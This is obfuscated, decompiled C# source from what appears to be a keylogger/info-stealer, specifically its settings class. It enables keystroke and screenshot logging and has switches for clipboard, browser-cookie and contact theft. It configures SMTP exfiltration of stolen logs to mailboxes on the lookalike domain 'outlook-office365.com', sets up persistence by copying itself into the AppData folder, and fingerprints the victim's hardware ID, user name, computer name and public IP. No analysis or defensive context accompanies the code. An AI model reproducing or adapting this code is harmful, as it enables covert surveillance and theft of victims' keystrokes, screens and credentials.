using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using q9Ep;

namespace ppkr;

public class dBDNalx6
{
	public static string PcHwid;

	public static string ThisComputerName;

	public static string AsmFilePath;

	public static string PublicIpAddress;

	public static bool PublicIpAddressGrab;

	public static string IpApi;

	public static gVe3wBP.ZUm lastInputInf;

	public static string PublicUserAgent;

	public static bool PcState;

	public static string Log_text;

	public static bool EnableKeylogger;

	public static bool EnableScreenLogger;

	public static bool EnableClipboardLogger;

	public static bool EnableTorPanel;

	public static bool EnableCookies;

	public static bool EnableContacts;

	public static bool DeleteBackspace;

	public static int TorPid;

	public static int KeyloggerInterval;

	public static int ScreenInterval;

	public static int LogType;

	public static bool SmtpSSL;

	public static int SmtpPort;

	public static bool SmtpAttach;

	public static string SmtpServer;

	public static string SmtpSender;

	public static string SmtpPassword;

	public static string SmtpReceiver;

	public static bool AppAddStartup;

	public static bool HideFileStartup;

	public static string AppStartupFullPath;

	public static string StartupDirectoryPath;

	public static string StartupEnvName;

	public static string StartupDirectoryName;

	public static string StartupInstallationName;

	public static string StartupRegName;

	public static void TG25DsxupuY()
	{
		int num = 0;
		do
		{
			if (num == 3)
			{
				StartupDirectoryPath = Path.Combine(Environment.GetEnvironmentVariable(StartupEnvName), StartupDirectoryName);
				num = 4;
			}
			if (num == 6)
			{
				if (!PublicIpAddressGrab)
				{
					break;
				}
				num = 7;
			}
			if (num == 4)
			{
				AppStartupFullPath = Path.Combine(StartupDirectoryPath, StartupInstallationName);
				num = 5;
			}
			if (num == 1)
			{
				PcHwid = JSBB9uM7nh._35Sj5uGoWdV();
				num = 2;
			}
			if (num == 2)
			{
				AsmFilePath = Assembly.GetExecutingAssembly().Location;
				num = 3;
			}
			if (num == 5)
			{
				ThisComputerName = SystemInformation.UserName + "/" + SystemInformation.ComputerName;
				num = 6;
			}
			if (num == 7)
			{
				PublicIpAddress = FZ9K2n1R.Px9zU143g();
				num = 8;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 8);
	}

	static dBDNalx6()
	{
		PcHwid = "";
		ThisComputerName = "";
		AsmFilePath = "";
		PublicIpAddress = "";
		PublicIpAddressGrab = Convert.ToBoolean("false");
		IpApi = "";
		lastInputInf = default;
		PublicUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0";
		PcState = true;
		Log_text = "";
		EnableKeylogger = Convert.ToBoolean("true");
		EnableScreenLogger = Convert.ToBoolean("true");
		EnableClipboardLogger = Convert.ToBoolean("false");
		EnableTorPanel = Convert.ToBoolean("false");
		EnableCookies = Convert.ToBoolean("false");
		EnableContacts = Convert.ToBoolean("false");
		DeleteBackspace = Convert.ToBoolean("false");
		TorPid = 0;
		KeyloggerInterval = Convert.ToInt32("20");
		ScreenInterval = Convert.ToInt32("20");
		LogType = Convert.ToInt32("1");
		SmtpSSL = Convert.ToBoolean("true");
		SmtpPort = Convert.ToInt32("587");
		SmtpAttach = Convert.ToBoolean("false");
		SmtpServer = "mail.outlook-office365.com";
		SmtpSender = "box@outlook-office365.com";
		SmtpPassword = "[redacted]";
		SmtpReceiver = "inbox@outlook-office365.com";
		AppAddStartup = Convert.ToBoolean("false");
		HideFileStartup = Convert.ToBoolean("false");
		AppStartupFullPath = "";
		StartupDirectoryPath = "";
		StartupEnvName = "appdata";
		StartupDirectoryName = "GLOZVJ";
		StartupInstallationName = "GLOZVJ.exe";
		StartupRegName = "GLOZVJ";
	}
}
